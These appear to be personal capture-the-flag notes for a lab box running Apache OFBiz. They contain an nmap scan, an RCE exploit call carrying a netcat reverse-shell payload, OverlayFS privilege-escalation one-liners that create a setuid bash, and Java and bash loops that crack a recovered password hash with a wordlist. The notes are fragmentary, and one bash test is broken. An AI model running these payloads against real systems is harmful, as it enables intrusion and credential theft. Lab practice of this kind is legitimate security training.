@@ -1,0 +1,212 @@
+10.10.11.252
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+└─$ nmap -sCV -Pn -p- --open 10.10.11.252 -o manager-bizness
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-07 03:04 +07
+Nmap scan report for 10.10.11.252
+Host is up (0.072s latency).
+Not shown: 64322 closed tcp ports (conn-refused), 1208 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp    open  http       nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+443/tcp   open  ssl/http   nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_ssl-date: TLS randomness does not represent time
+| tls-nextprotoneg: 
+|_  http/1.1
+|_http-server-header: nginx/1.18.0
+| tls-alpn: 
+|_  http/1.1
+8000/tcp  open  http-alt?
+38797/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 127.85 seconds
+
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+80,443
+	dirsearch -u http://bizness.htb -e "*" -r
+	Powered by Apache OFBiz. Release 18.12
+
+wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
+
+sudo update-alternatives --config java ==> java 11
+
+python3 exploit.py 'https://bizness.htb:443/' rce 'nc 10.10.16.72 443 -e /bin/bash'
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+CVE-2023-2640-CVE-2023-32629
+
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /tmp/test/bash && chmod 4755 /tmp/test/bash")'
+
+
+/bin/perl
+unshare -rm sh -c "mkdir l u w m && cp /bin/perl l/;/sbin/setcap cap_setuid+eip l/perl;/usr/bin/mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;"
+
+
+logrotate 3.18.0   ???
+https://github.com/whotwagner/logrotten ==> try this
+
+Derby database
+
+find / -name derby 2>/dev/null 
+
+Derby 10.14.2.0
+
+$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+
+
+tr --delete --complement A-Za-z0-9 </dev/urandom | head --bytes=16
+
+
+$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
+monkeybizness
+
+nano ofbiz/framework/base/src/main/java/org/apache/ofbiz/base/crypto/Main.java
+
+        // try bruce password
+        // /home/kali/stuffs/htb/bizness.htb/ofbiz/framework/base/src/main/java/org/apache/ofbiz/base/crypto/Main.java
+        String oldPassword = "$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I";
+        String hashType = "SHA";
+        //String oldPassword= HashCrypt.cryptBytes(hashType, null, "Password".getBytes(UtilIO.getUtf8()));
+        //System.out.println("Test password: " + oldPassword);
+        int  i =0;
+        try {
+            File myObj = new File("/usr/share/wordlists/rockyou.txt");
+            //Scanner myReader = new Scanner(myObj);
+            BufferedReader br = new BufferedReader(new FileReader(myObj));
+            String newPassword;
+            //while (myReader.hasNextLine()) {
+            while ((newPassword = br.readLine()) != null){
+                i++;
+                //String newPassword = myReader.nextLine();
+                if (HashCrypt.comparePassword(oldPassword,hashType,newPassword)){
+                    System.out.println("Correct:" + newPassword + " - Success");
+                    break;
+                }
+                //System.out.println("Tried:" + newPassword + " - Failed");
+            }
+            //myReader.close();
+        } catch (FileNotFoundException e) {
+            System.out.println("An error occurred.");
+            e.printStackTrace();
+        }
+        System.out.println("i = " + i);
+
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+gradle vs malven
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+  if [ ! -f "$CONTAINER_ADMIN_LOADED" ]; then
+    TMPFILE=$(mktemp)
+
+    # Concatenate a random salt and the admin password.
+    SALT=$(tr --delete --complement A-Za-z0-9 </dev/urandom | head --bytes=16)
+    SALT_AND_PASSWORD="${SALT}${OFBIZ_ADMIN_PASSWORD}"
+	
+	$61e4SK1PhSgKIJEO$mypassword
+
+    # Take a SHA-1 hash of the combined salt and password and strip off any additional output form the sha1sum utility.
+    SHA1SUM_ASCII_HEX=$(printf "$SALT_AND_PASSWORD" | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\000')
+	
+	printf '$61e4SK1PhSgKIJEO$mypassword' | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\000'
+	
+	53fcac9cad3243f980c2350c39cbb85de4e68d6e
+	
+    # Convert the ASCII Hex representation of the hash to raw bytes by inserting escape sequences and running
+    # through the printf command. Encode the result as URL base 64 and remove padding.
+    SHA1SUM_ESCAPED_STRING=$(printf "$SHA1SUM_ASCII_HEX" | sed -e 's/\(..\)\.\?/\\x\1/g')
+    SHA1SUM_BASE64=$(printf "$SHA1SUM_ESCAPED_STRING" | basenc --base64url --wrap=0 | tr --delete '=')
+	
+	printf '53fcac9cad3243f980c2350c39cbb85de4e68d6e' | sed -e 's/\(..\)\.\?/\\x\1/g'
+	\x53\xfc\xac\x9c\xad\x32\x43\xf9\x80\xc2\x35\x0c\x39\xcb\xb8\x5d\xe4\xe6\x8d\x6e
+	
+	SHA1SUM_BASE64=$(printf "$SHA1SUM_ESCAPED_STRING" | basenc --base64url --wrap=0 | tr --delete '=')
+	
+	printf '\x53\xfc\xac\x9c\xad\x32\x43\xf9\x80\xc2\x35\x0c\x39\xcb\xb8\x5d\xe4\xe6\x8d\x6e' | basenc --base64url --wrap=0 | tr --delete '='
+	U_ysnK0yQ_mAwjUMOcu4XeTmjW4
+	
+    # Concatenate the hash type, salt and hash as the encoded password value.
+    ENCODED_PASSWORD_HASH="\$SHA\$${SALT}\$${SHA1SUM_BASE64}"
+	
+	
+	$SHA$61e4SK1PhSgKIJEO$U_ysnK0yQ_mAwjUMOcu4XeTmjW4
+	
+	
+    # Populate the login data template
+    sed "s/@userLoginId@/$OFBIZ_ADMIN_USER/g; s/currentPassword=\".*\"/currentPassword=\"$ENCODED_PASSWORD_HASH\"/g;" framework/resources/templates/AdminUserLoginData.xml >"$TMPFILE"
+
+    # Load data from the populated template.
+    /ofbiz/bin/ofbiz --load-data "file=$TMPFILE"
+
+    rm "$TMPFILE"
+
+    touch "$CONTAINER_ADMIN_LOADED"
+
+
+
+
+USERHASH='$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I';
+SALT='d';
+
+for OFBIZ_ADMIN_PASSWORD in $(cat /usr/share/wordlists/rockyou.txt)
+do 
+	SALT_AND_PASSWORD="${SALT}${OFBIZ_ADMIN_PASSWORD}";
+	SHA1SUM_ASCII_HEX=$(printf "$SALT_AND_PASSWORD" | sha1sum | cut --delimiter=' ' --fields=1 --zero-terminated | tr --delete '\000');
+	SHA1SUM_ESCAPED_STRING=$(printf "$SHA1SUM_ASCII_HEX" | sed -e 's/\(..\)\.\?/\\x\1/g');
+	SHA1SUM_BASE64=$(printf "$SHA1SUM_ESCAPED_STRING" | basenc --base64url --wrap=0 | tr --delete '=');
+	ENCODED_PASSWORD_HASH="\$SHA\$${SALT}\$${SHA1SUM_BASE64}";
+	/bin/echo "Try: $OFBIZ_ADMIN_PASSWORD"
+	if [ "$USERHASH" === "$ENCODED_PASSWORD_HASH" ]; then
+		/bin/echo "Found: $ENCODED_PASSWORD_HASH";
+		break;
+	fi
+done
+
+
+
+
+
+
+
+$SHA$61e4SK1PhSgKIJEO$U_ysnK0yQ_mAwjUMOcu4XeTmjW4
+
+
+
+    private static String getCryptedBytes(String hashType, String salt, byte[] bytes) {
+        try {
+            MessageDigest messagedigest = MessageDigest.getInstance(hashType);
+            messagedigest.update(salt.getBytes(UtilIO.getUtf8()));
+            messagedigest.update(bytes);
+            return Base64.encodeBase64URLSafeString(messagedigest.digest()).replace('+', '.');
+        } catch (NoSuchAlgorithmException e) {
+            throw new GeneralRuntimeException("Error while comparing password", e);
+        }
+    }
